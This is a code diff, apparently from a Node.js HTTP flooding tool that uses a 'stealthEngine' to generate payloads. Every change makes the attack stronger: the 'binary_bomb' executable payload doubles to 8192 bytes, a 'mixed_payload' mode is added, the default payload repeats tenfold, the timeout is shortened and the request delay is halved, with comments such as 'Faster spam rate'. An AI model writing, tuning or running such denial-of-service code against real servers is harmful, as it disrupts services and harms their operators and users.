@@ -1299,11 +1308,15 @@ if (cluster.isMaster) {
                                     headers['Content-Type'] = 'application/json';
                                     break;
                                 case 'binary_bomb':
-                                    payload = stealthEngine.generateExecutableBinary(2048);
+                                    payload = stealthEngine.generateExecutableBinary(8192); // Doubled size
+                                    headers['Content-Type'] = 'application/octet-stream';
+                                    break;
+                                case 'mixed_payload':
+                                    payload = this.generateMixedPayload();
                                     headers['Content-Type'] = 'application/octet-stream';
                                     break;
                                 default:
-                                    payload = '{"test":"data"}';
+                                    payload = '{"test":"optimized_data"}'.repeat(10); // Increased repetition
                                     headers['Content-Type'] = 'application/json';
                             }
                             
@@ -1319,7 +1332,7 @@ if (cluster.isMaster) {
                             method: method,
                             headers: headers,
                             agent: this.agent,
-                            timeout: 5000
+                            timeout: 2000 // Faster timeout
                         };
 
                         const req = httpModule.request(options, res => {
@@ -1353,11 +1366,13 @@ if (cluster.isMaster) {
                     if (!this.isEstablishing) {
                         await this.sendRequest();
                     }
-                    await sleep(this.config.delayMs);
+                    await sleep(this.config.delayMs / 2); // Faster spam rate
                 }
             }
         }
     }
+
+    let stealthEngine = null;
 
     process.on('message', (message) => {
         if (message.type === 'init') {
